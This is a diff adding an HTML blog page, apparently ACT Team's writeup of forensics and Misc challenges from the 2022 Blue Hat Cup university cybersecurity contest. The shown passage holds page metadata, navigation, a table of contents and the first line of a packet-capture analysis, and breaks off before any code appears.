@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="第六届”蓝帽杯“全国大学生网络安全技能大赛 Writeups By ACT Team. 2022.7.9  Misc1. domainhacker打开数据包，分析http流量，发现大马（shell连接管理工具）  12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第六届蓝帽杯全国大学生网络安全技能大赛初赛Writeup">
+<meta property="og:url" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/index.html">
+<meta property="og:site_name" content="ACT Team">
+<meta property="og:description" content="第六届”蓝帽杯“全国大学生网络安全技能大赛 Writeups By ACT Team. 2022.7.9  Misc1. domainhacker打开数据包，分析http流量，发现大马（shell连接管理工具）  12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709195754404.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709203001224.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709203759107.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709203846543.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709205130243.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709205121443.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709205115357.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709205108371.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709205102750.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709205056605.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709205049358.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709205035986.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709205029581.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709205014408.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709205008184.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709204948195.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/clip_image003.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709204453376.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709204501928.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709204520285.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709204530241.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709204539502.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709204858323.png">
+<meta property="article:published_time" content="2022-07-09T10:00:00.000Z">
+<meta property="article:modified_time" content="2022-09-02T12:49:04.055Z">
+<meta property="article:author" content="ACT">
+<meta property="article:tag" content="2022">
+<meta property="article:tag" content="第六届蓝帽杯全国大学生网络安全技能大赛初赛">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709195754404.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>第六届蓝帽杯全国大学生网络安全技能大赛初赛Writeup</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="ACT Team" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/&text=第六届蓝帽杯全国大学生网络安全技能大赛初赛Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/&title=第六届蓝帽杯全国大学生网络安全技能大赛初赛Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/&is_video=false&description=第六届蓝帽杯全国大学生网络安全技能大赛初赛Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=第六届蓝帽杯全国大学生网络安全技能大赛初赛Writeup&body=Check out this article: http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/&title=第六届蓝帽杯全国大学生网络安全技能大赛初赛Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/&title=第六届蓝帽杯全国大学生网络安全技能大赛初赛Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/&title=第六届蓝帽杯全国大学生网络安全技能大赛初赛Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/&title=第六届蓝帽杯全国大学生网络安全技能大赛初赛Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/&name=第六届蓝帽杯全国大学生网络安全技能大赛初赛Writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/&t=第六届蓝帽杯全国大学生网络安全技能大赛初赛Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-domainhacker"><span class="toc-number">1.1.</span> <span class="toc-text">1. domainhacker</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81"><span class="toc-number">2.</span> <span class="toc-text">电子取证</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%89%8B%E6%9C%BA%E5%8F%96%E8%AF%811"><span class="toc-number">2.1.</span> <span class="toc-text">1. 手机取证1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%89%8B%E6%9C%BA%E5%8F%96%E8%AF%812"><span class="toc-number">2.2.</span> <span class="toc-text">2. 手机取证2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%8F%96%E8%AF%811"><span class="toc-number">2.3.</span> <span class="toc-text">3. 计算机取证1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%8F%96%E8%AF%812"><span class="toc-number">2.4.</span> <span class="toc-text">4. 计算机取证2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90-1"><span class="toc-number">2.5.</span> <span class="toc-text">5. 程序分析_1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90-2"><span class="toc-number">2.6.</span> <span class="toc-text">6. 程序分析_2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90-3"><span class="toc-number">2.7.</span> <span class="toc-text">7. 程序分析_3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E7%BD%91%E7%AB%99%E5%8F%96%E8%AF%81-1"><span class="toc-number">2.8.</span> <span class="toc-text">8. 网站取证_1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-%E7%BD%91%E7%AB%99%E5%8F%96%E8%AF%81-2"><span class="toc-number">2.9.</span> <span class="toc-text">9. 网站取证_2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-%E7%BD%91%E7%AB%99%E5%8F%96%E8%AF%81-3"><span class="toc-number">2.10.</span> <span class="toc-text">10. 网站取证_3</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        第六届蓝帽杯全国大学生网络安全技能大赛初赛Writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">ACT</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-07-09T10:00:00.000Z" itemprop="datePublished">2022-07-09</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a> › <a class="category-link" href="/categories/CTF/Writeup/">Writeup</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/2022/" rel="tag">2022</a>, <a class="tag-link-link" href="/tags/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9B/" rel="tag">第六届蓝帽杯全国大学生网络安全技能大赛初赛</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <blockquote>
+<p>第六届”蓝帽杯“全国大学生网络安全技能大赛 Writeups By ACT Team. 2022.7.9</p>
+</blockquote>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="1-domainhacker"><a href="#1-domainhacker" class="headerlink" title="1. domainhacker"></a>1. domainhacker</h3><p>打开数据包，分析http流量，发现大马（shell连接管理工具）</p>
+<p><img src="/./%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709195754404.png" alt="image-20220709195754404"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span 